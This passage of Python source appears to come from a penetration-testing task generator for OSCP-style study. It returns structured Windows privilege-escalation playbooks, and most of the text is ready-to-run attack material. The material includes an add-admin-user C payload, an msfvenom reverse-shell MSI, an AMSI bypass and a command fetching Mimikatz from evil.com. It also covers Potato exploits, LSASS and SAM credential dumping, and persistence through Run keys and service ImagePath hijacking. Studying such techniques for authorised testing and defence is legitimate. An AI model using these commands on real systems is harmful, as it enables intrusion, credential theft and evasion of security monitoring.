                            'Step 3: Trigger encryption by app (save password, etc.)',
                            'Step 4: entropy.bin file created with captured entropy',
                            'Step 5: Decrypt: SharpDPAPI.exe blob /target:file /entropy:entropy.bin /ntlm:HASH'
                        ],
                        'success_indicators': [
                            'EntropyCapture hooked DPAPI functions',
                            'entropy.bin created with non-zero size',
                            'Decryption succeeds with entropy supplied'
                        ],
                        'failure_indicators': [
                            'Injection failed (protected process)',
                            'No entropy captured (app not using DPAPI)',
                            'Wrong entropy extracted'
                        ],
                        'next_steps': [
                            'Decrypt all blobs from same application',
                            'Search for hardcoded entropy in application DLLs (reverse engineering)',
                            'Case study: Zscaler entropy = XOR(HARDCODED_SECRET, USER_SID)'
                        ],
                        'tags': ['OSCP:LOW', 'ADVANCED', 'CREDENTIALS'],
                        'notes': 'Advanced technique. Download: https://github.com/SpecterOps/EntropyCapture'
                    }
                }
            ]
        }

    def _get_handle_exploitation_tasks(self, target: str) -> Dict[str, Any]:
        """Generate leaked handle exploitation tasks"""
        return {
            'id': 'handle-exploit',
            'name': 'Leaked Handle Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'enumerate-handles',
                    'name': 'Enumerate Process Handles',
                    'type': 'command',
                    'metadata': {
                        'command': 'handle64.exe /a | findstr /r /i "process thread file key pid:"',
                        'description': 'List all handles accessible to current user (look for inherited privileged handles)',
                        'flag_explanations': {
                            'handle64.exe': 'Sysinternals tool to display handle information',
                            '/a': 'Show all handles (not just files)',
                            'findstr /r /i': 'Regex case-insensitive filter',
                            '"process thread file key pid:"': 'Show process, thread, file, registry handles with PIDs'
                        },
                        'success_indicators': [
                            'Handles from privileged processes visible',
                            'Process/Thread handles with write permissions found',
                            'File/Registry handles to sensitive locations'
                        ],
                        'failure_indicators': [
                            'Only own process handles visible',
                            'No privileged handles inherited',
                            'Access denied enumerating handles'
                        ],
                        'next_steps': [
                            'Identify handles with dangerous permissions: PROCESS_ALL_ACCESS, THREAD_SET_CONTEXT',
                            'Check if any SYSTEM process handles are accessible',
                            'Use Process Hacker GUI for detailed handle inspection',
                            'Automate with LeakedHandlesFinder tool'
                        ],
                        'alternatives': [
                            'Process Hacker: Right-click process > Handles',
                            'PowerShell: Get-Process | Select-Object Id,Name,Handles',
                            'LeakedHandlesFinder: https://github.com/lab52io/LeakedHandlesFinder'
                        ],
                        'tags': ['OSCP:LOW', 'ENUM', 'ADVANCED'],
                        'notes': 'Requires SeDebugPrivilege to see all handles. Can run without admin to see own handles.'
                    }
                },
                {
                    'id': 'exploit-process-handle',
                    'name': 'Exploit Leaked Process Handle',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject shellcode into privileged process via inherited handle',
                        'alternatives': [
                            'Scenario: Service creates low-priv process with bInheritHandles=TRUE',
                            'Step 1: Enumerate handles: handle64.exe /a > handles.txt',
                            'Step 2: Find inherited process handle with PROCESS_ALL_ACCESS',
                            'Step 3: Compile exploit: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread',
                            'Step 4: Inject shellcode into privileged process via handle',
                            'Step 5: Execute shellcode as SYSTEM',
                            'Code template: http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/',
                            'Permissions needed: PROCESS_CREATE_THREAD, PROCESS_VM_WRITE, PROCESS_DUP_HANDLE'
                        ],
                        'success_indicators': [
                            'VirtualAllocEx succeeds',
                            'WriteProcessMemory writes shellcode',
                            'CreateRemoteThread starts execution',
                            'Shellcode runs as privileged user'
                        ],
                        'failure_indicators': [
                            'No leaked handles found',
                            'Insufficient handle permissions',
                            'Shellcode injection blocked by AV/DEP'
                        ],
                        'next_steps': [
                            'Use handle to open process: OpenProcess with inherited handle',
                            'Allocate memory in target: VirtualAllocEx',
                            'Write shellcode: WriteProcessMemory',
                            'Execute: CreateRemoteThread pointing to shellcode'
                        ],
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                        'notes': 'Rare vulnerability. Seen in auto-updaters and services spawning child processes incorrectly.'
                    }
                },
                {
                    'id': 'exploit-file-handle',
                    'name': 'Exploit Leaked File/Registry Handle',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Overwrite privileged files via inherited writable file handles',
                        'alternatives': [
                            'Scenario: Privileged service opens file handle, spawns child with inheritance',
                            'Step 1: Enumerate file handles: handle64.exe | findstr "File"',
                            'Step 2: Identify writable handles to sensitive files (service binaries, config)',
                            'Step 3: Duplicate handle in your process: DuplicateHandle Win32 API',
                            'Step 4: Write malicious content to inherited handle',
                            'Step 5: Restart service or wait for privileged access',
                            'Registry: Same process but with Registry handles (RegSetValueEx)'
                        ],
                        'success_indicators': [
                            'Writable handle to privileged file found',
                            'File content overwritten successfully',
                            'Service binary replaced with backdoor'
                        ],
                        'failure_indicators': [
                            'No writable file handles',
                            'File locked by process',
                            'Access denied writing to handle'
                        ],
                        'next_steps': [
                            'Identify critical files with leaked handles',
                            'Overwrite service binary for persistence',
                            'Modify registry keys for privilege escalation',
                            'Wait for service restart or system reboot'
                        ],
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                        'notes': 'Very rare. Requires service with poor handle management. Check file permissions first.'
                    }
                }
            ]
        }

    def _get_payload_compilation_tasks(self, target: str) -> Dict[str, Any]:
        """Generate Windows payload compilation tasks"""
        return {
            'id': 'payload-compilation',
            'name': 'Windows C Payload Compilation',
            'type': 'parent',
            'children': [
                {
                    'id': 'compile-adduser',
                    'name': 'Compile Add Admin User Payload',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create simple payload to add administrative user',
                        'alternatives': [
                            'Code: #include <stdlib.h> int main() { system("net user hacker Hacker123! /add"); system("net localgroup administrators hacker /add"); return 0; }',
                            'Save as adduser.c',
                            'Compile x86: i686-w64-mingw32-gcc -s -O2 -o adduser.exe adduser.c',
                            'Compile x64: x86_64-w64-mingw32-gcc -s -O2 -o adduser.exe adduser.c',
                            'Transfer to target and execute when SYSTEM context obtained',
                            'Alternative: Use as AlwaysInstallElevated MSI wrapper payload'
                        ],
                        'success_indicators': [
                            'Compilation succeeds without errors',
                            'Binary size < 100KB',
                            'Execution creates user: net user',
                            'User added to Administrators group'
                        ],
                        'failure_indicators': [
                            'Compilation errors',
                            'Binary flagged by AV',
                            'Execution fails on target (wrong architecture)'
                        ],
                        'next_steps': [
                            'Test on target: adduser.exe',
                            'Verify user created: net user hacker',
                            'Login via RDP or WinRM with new credentials',
                            'Combine with service hijacking for privilege escalation'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PAYLOAD', 'MANUAL'],
                        'notes': 'Kali includes mingw cross-compilers: apt install mingw-w64'
                    }
                },
                {
                    'id': 'compile-uac-bypass',
                    'name': 'Compile UAC Bypass (fodhelper.exe)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Registry-based UAC bypass to spawn High integrity cmd.exe',
                        'alternatives': [
                            'Exploit: fodhelper.exe queries HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command',
                            'Registry key is user-writable (Medium integrity sufficient)',
                            'Step 1: Create vulnerable registry key via C code',
                            'Step 2: Set default value to payload command',
                            'Step 3: Set DelegateExecute to empty (triggers bypass)',
                            'Step 4: Launch fodhelper.exe (auto-elevated)',
                            'Code template in windows-c-payloads.md',
                            'Compile: x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_bypass.exe uac.c'
                        ],
                        'success_indicators': [
                            'Registry keys created successfully',
                            'fodhelper.exe launches payload',
                            'Payload runs in High integrity level',
                            'UAC prompt bypassed'
                        ],
                        'failure_indicators': [
                            'Registry modification fails',
                            'fodhelper.exe doesn\'t execute payload',
                            'Still running in Medium integrity'
                        ],
                        'next_steps': [
                            'Verify High integrity: whoami /groups | findstr "High"',
                            'Use High integrity for token manipulation to SYSTEM',
                            'Alternative UAC bypasses: eventvwr.exe, computerdefaults.exe',
                            'Clean up registry keys after exploitation'
                        ],
                        'tags': ['OSCP:HIGH', 'PAYLOAD', 'UAC_BYPASS'],
                        'notes': 'Works on Windows 10/11 as of 2025. Microsoft considers registry-based UAC bypass "by design".'
                    }
                },
                {
                    'id': 'compile-token-theft',
                    'name': 'Compile Token Theft Payload',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Steal SYSTEM token from winlogon.exe and spawn cmd.exe',
                        'alternatives': [
                            'Requirements: SeDebugPrivilege + SeImpersonatePrivilege',
                            'Step 1: Find winlogon.exe PID: tasklist | findstr winlogon',
                            'Step 2: Use code template from sedebug-+-seimpersonate-copy-token.md',
                            'Step 3: OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)',
                            'Step 4: OpenProcessToken + DuplicateTokenEx',
                            'Step 5: CreateProcessWithTokenW to spawn cmd.exe as SYSTEM',
                            'Compile: x86_64-w64-mingw32-gcc -O2 -o token_theft.exe theft.c -ladvapi32',
                            'Alternative targets: services.exe, wininit.exe (NOT csrss - protected)'
                        ],
                        'success_indicators': [
                            'OpenProcess succeeds',
                            'Token duplication successful',
                            'cmd.exe spawns as NT AUTHORITY\\SYSTEM',
                            'All privileges enabled in new process'
                        ],
                        'failure_indicators': [
                            'Access denied opening process',
                            'Token duplication fails',
                            'CreateProcessWithTokenW error 1314 (insufficient privilege)'
                        ],
                        'next_steps': [
                            'Verify SYSTEM context: whoami',
                            'Dump LSASS for credentials: procdump -ma lsass.exe lsass.dmp',
                            'Enable all privileges: whoami /priv',
                            'Extract SAM/SYSTEM: reg save HKLM\\SAM sam.hive'
                        ],
                        'tags': ['OSCP:HIGH', 'PAYLOAD', 'EXPLOIT'],
                        'notes': 'Requires both SeDebug and SeImpersonate. Common in service accounts.'
                    }
                },
                {
                    'id': 'compile-amsi-patch',
                    'name': 'Compile AMSI/ETW Patch',
                    'type': 'manual',
                    'metadata': {
                        'description': 'In-memory patch to disable AMSI and ETW in current process',
                        'alternatives': [
                            'AMSI: Antimalware Scan Interface (scans PowerShell, JScript)',
                            'ETW: Event Tracing for Windows (logs PowerShell activity)',
                            'Step 1: Patch AmsiScanBuffer to return AMSI_RESULT_E_INVALIDARG',
                            'Step 2: Patch EtwEventWrite to return success without logging',
                            'Step 3: VirtualProtect to make .text section writable',
                            'Step 4: memcpy patched bytes to function addresses',
                            'Code template in windows-c-payloads.md',
                            'Compile: gcc -o patch_amsi.exe patch.c -lntdll',
                            'Execute before loading PowerShell scripts'
                        ],
                        'success_indicators': [
                            'Functions patched without errors',
                            'AMSI no longer scans PowerShell commands',
                            'ETW logging disabled',
                            'Malicious scripts execute without detection'
                        ],
                        'failure_indicators': [
                            'VirtualProtect fails (DEP enabled)',
                            'Patch detection by AV/EDR',
                            'Functions still active after patch'
                        ],
                        'next_steps': [
                            'Load malicious PowerShell: IEX((New-Object Net.WebClient).DownloadString("http://evil.com/invoke-mimikatz.ps1"))',
                            'Test with AMSI test string: "AMSI Test Sample"',
                            'Alternative: PowerShell AMSI bypass: [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
                            'Combine with Mimikatz, Rubeus, or other tools'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PAYLOAD', 'DEFENSE_EVASION'],
                        'notes': 'Process-local only. Each new PowerShell instance needs re-patching.'
                    }
                }
            ]
        }

    def _get_autorun_privesc_tasks(self, target: str) -> Dict[str, Any]:
        """Generate autorun-based privilege escalation tasks"""
        return {
            'id': 'autorun-privesc',
            'name': 'Autorun & Startup Persistence Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'autorun-registry',
                    'name': 'Check Autorun Registry Keys',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
                        'description': 'Check HKLM autorun registry keys for privilege escalation',
                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'QUICK_WIN'],
                        'flag_explanations': {
                            'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run': 'System-wide autorun keys (requires admin to modify)'
                        },
                        'success_indicators': [
                            'Registry entries found',
                            'Writable autorun entries discovered',
                            'Paths with weak permissions'
                        ],
                        'failure_indicators': [
                            'Access denied',
                            'No autorun entries',
                            'All paths properly secured'
                        ],
                        'next_steps': [
                            'Check HKCU autorun keys: reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
                            'Test write permissions: icacls "C:\\path\\to\\executable.exe"',
                            'Replace with malicious binary if writable',
                            'Check Startup folder: dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
                        ],
                        'alternatives': [
                            'Manual registry editor check',
                            'PowerShell: Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                            'Autoruns.exe from Sysinternals',
                            'WinPEAS autorun check'
                        ],
                        'notes': 'Autorun entries execute at user login. HKLM requires admin, HKCU does not.'
                    }
                },
                {
                    'id': 'startup-folder-check',
                    'name': 'Check Startup Folder Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
                        'description': 'Check if Startup folder is writable by current user',
                        'tags': ['OSCP:HIGH', 'PERSISTENCE'],
                        'success_indicators': [
                            'Write permissions found',
                            'Successfully placed payload in Startup folder',
                            'Payload executes on next login'
                        ],
                        'failure_indicators': [
                            'No write access',
                            'Folder does not exist',
                            'AV blocks payload placement'
                        ],
                        'next_steps': [
                            'If writable: copy malicious.exe "Startup\\update.exe"',
                            'Trigger reboot or wait for user login',
                            'Check user Startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                            'Combine with SeImpersonatePrivilege to escalate on execution'
                        ],
                        'alternatives': [
                            'Check user Startup: dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
                            'Registry approach: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\path\\to\\malicious.exe"'
                        ]
                    }
                }
            ]
        }

    def _get_com_hijacking_tasks(self, target: str) -> Dict[str, Any]:
        """Generate COM hijacking privilege escalation tasks"""
        return {
            'id': 'com-hijacking',
            'name': 'COM Hijacking & DLL Search Order',
            'type': 'parent',
            'children': [
                {
                    'id': 'com-enum',
                    'name': 'Enumerate COM Objects',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query HKCR\\CLSID /s /f "InprocServer32"',
                        'description': 'Find COM objects that load DLLs from user-controlled paths',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'success_indicators': [
                            'COM objects found',
                            'DLL paths in user-writable locations',
                            'Missing DLLs that can be hijacked'
                        ],
                        'failure_indicators': [
                            'All DLLs in system directories',
                            'No user-writable paths',
                            'Access denied'
                        ],
                        'next_steps': [
                            'Look for DLL paths under %LOCALAPPDATA% or %TEMP%',
                            'Check if DLL exists: dir "C:\\path\\to\\dll"',
                            'If missing: create malicious DLL with same name',
                            'Compile DLL: x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ChildItem HKLM:\\Software\\Classes\\CLSID -Recurse',
                            'Process Monitor (procmon.exe) to track DLL loads',
                            'SharpUp.exe for automated COM hijacking checks'
                        ],
                        'notes': 'COM hijacking requires understanding of DLL search order and COM registration'
                    }
                }
            ]
        }

    def _get_msi_exploitation_tasks(self, target: str) -> Dict[str, Any]:
        """Generate MSI installer privilege escalation tasks"""
        return {
            'id': 'msi-exploitation',
            'name': 'MSI AlwaysInstallElevated Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'msi-check',
                    'name': 'Check AlwaysInstallElevated Policy',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                        'description': 'Check if AlwaysInstallElevated is enabled (both HKLM and HKCU must be 1)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                        'success_indicators': [
                            'Both registry keys exist',
                            'Both set to 0x1',
                            'MSI installers will run with SYSTEM privileges'
                        ],
                        'failure_indicators': [
                            'Keys do not exist',
                            'One or both set to 0x0',
                            'Access denied'
                        ],
                        'next_steps': [
                            'If enabled: Create malicious MSI with msfvenom',
                            'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o privesc.msi',
                            'Transfer MSI to target',
                            'Execute: msiexec /quiet /qn /i privesc.msi',
                            'Alternative: Use WiX Toolset to create custom MSI'
                        ],
                        'alternatives': [
                            'Manual registry check in regedit',
                            'PowerShell: Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"',
                            'WinPEAS AlwaysInstallElevated check',
                            'Create MSI with custom actions for persistence'
                        ],
                        'notes': 'AlwaysInstallElevated is a dangerous misconfiguration. MSI runs as SYSTEM regardless of user privileges.'
                    }
                }
            ]
        }

    def _get_service_registry_abuse_tasks(self, target: str) -> Dict[str, Any]:
        """Generate service registry abuse privilege escalation tasks"""
        return {
            'id': 'service-registry-abuse',
            'name': 'Service Registry Modification Abuse',
            'type': 'parent',
            'children': [
                {
                    'id': 'service-reg-perms',
                    'name': 'Check Service Registry Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
                        'description': 'Enumerate services and check if registry keys are writable',
                        'tags': ['OSCP:HIGH', 'SERVICES'],
                        'success_indicators': [
                            'Service registry keys found',
                            'User has write access to service ImagePath',
                            'Can modify service parameters'
                        ],
                        'failure_indicators': [
                            'No write access',
                            'All services properly secured',
                            'Access denied'
                        ],
                        'next_steps': [
                            'For each service, check permissions: Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<ServiceName>',
                            'If writable: reg add HKLM\\System\\CurrentControlSet\\Services\\<ServiceName> /v ImagePath /t REG_EXPAND_SZ /d "C:\\path\\to\\malicious.exe" /f',
                            'Restart service: sc stop <ServiceName> && sc start <ServiceName>',
                            'Or wait for system reboot'
                        ],
                        'alternatives': [
                            'PowerShell: Get-Service | ForEach { Get-Acl "HKLM:\\System\\CurrentControlSet\\Services\\$($_.Name)" }',
                            'accesschk.exe -kvuqsw HKLM\\System\\CurrentControlSet\\Services',
                            'SharpUp.exe for automated service checks'
                        ],
                        'notes': 'Modifying service ImagePath requires write access to service registry key. Service must be startable.'
                    }
                }
            ]
        }

    def _get_potato_extended_tasks(self, target: str) -> Dict[str, Any]:
        """Generate extended Potato-family exploit tasks"""
        return {
            'id': 'potato-extended',
            'name': 'Potato-Family Exploits (Extended)',
            'type': 'parent',
            'children': [
                {
                    'id': 'juicy-potato',
                    'name': 'JuicyPotato (Windows Server 2016 and older)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use JuicyPotato for SYSTEM via SeImpersonatePrivilege',
                        'alternatives': [
                            'Requirements: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege',
                            'Download: https://github.com/ohpe/juicy-potato/releases',
                            'Transfer to target: certutil -urlcache -split -f http://<LHOST>/JuicyPotato.exe jp.exe',
                            'Find CLSID for OS: https://ohpe.it/juicy-potato/CLSID/',
                            'Execute: jp.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c net user hacker Hacker123! /add && net localgroup administrators hacker /add" -l 1337 -c {CLSID}',
                            'Alternative payload: Reverse shell or enable RDP'
                        ],
                        'success_indicators': [
                            'Exploit succeeds',
                            'Command executes as SYSTEM',
                            'New admin user created',
                            'Reverse shell received as SYSTEM'
                        ],
                        'failure_indicators': [
                            'CLSID not working (try different CLSID)',
                            'SeImpersonatePrivilege not held',
                            'Windows 10/Server 2019+ (use RoguePotato instead)'
                        ],
                        'next_steps': [
                            'Verify SYSTEM: whoami',
                            'Dump credentials: mimikatz, procdump',
                            'Extract SAM/SYSTEM hives',
                            'Establish persistence'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'POTATO'],
                        'notes': 'JuicyPotato patched in Windows 10 1809+ and Server 2019+. Use RoguePotato for newer systems.'
                    }
                },
                {
                    'id': 'rogue-potato',
                    'name': 'RoguePotato (Windows 10/Server 2019+)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use RoguePotato for SYSTEM on patched systems',
                        'alternatives': [
                            'Requirements: SeImpersonatePrivilege',
                            'Download: https://github.com/antonioCoco/RoguePotato/releases',
                            'Setup socat relay on attacker: sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999',
                            'Transfer RoguePotato.exe to target',
                            'Execute: RoguePotato.exe -r <LHOST> -e "cmd.exe /c whoami" -l 9999',
                            'For reverse shell: -e "C:\\path\\to\\reverse.exe"'
                        ],
                        'success_indicators': [
                            'Exploit succeeds',
                            'Command executes as SYSTEM',
                            'Reverse shell as SYSTEM'
                        ],
                        'failure_indicators': [
                            'socat relay fails',
                            'Port 135 not accessible from target',
                            'SeImpersonatePrivilege not held'
                        ],
                        'next_steps': [
                            'Verify SYSTEM context',
                            'Dump LSASS',
                            'Extract hashes',
                            'Pivot to other systems'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'POTATO'],
                        'notes': 'RoguePotato works on systems where JuicyPotato is patched. Requires network relay.'
                    }
                },
                {
                    'id': 'god-potato',
                    'name': 'GodPotato (Windows Server 2012-2022)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use GodPotato for SYSTEM with minimal requirements',
                        'alternatives': [
                            'Requirements: SeImpersonatePrivilege',
                            'Download: https://github.com/BeichenDream/GodPotato/releases',
                            'Transfer to target',
                            'Execute: GodPotato.exe -cmd "cmd /c whoami"',
                            'For reverse shell: GodPotato.exe -cmd "C:\\path\\to\\reverse.exe"',
                            'Simplest Potato variant - no CLSID or relay needed'
                        ],
                        'success_indicators': [
                            'Command executes as SYSTEM',
                            'No network relay required',
                            'Works on latest Windows Server'
                        ],
                        'failure_indicators': [
                            'Exploit fails',
                            'SeImpersonatePrivilege not held',
                            'AV blocks execution'
                        ],
                        'next_steps': [
                            'Add admin user',
                            'Enable RDP',
                            'Dump credentials',
                            'Establish persistence'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'POTATO', 'QUICK_WIN'],
                        'notes': 'GodPotato is the newest and simplest Potato variant. Works on Server 2022.'
                    }
                }
            ]
        }
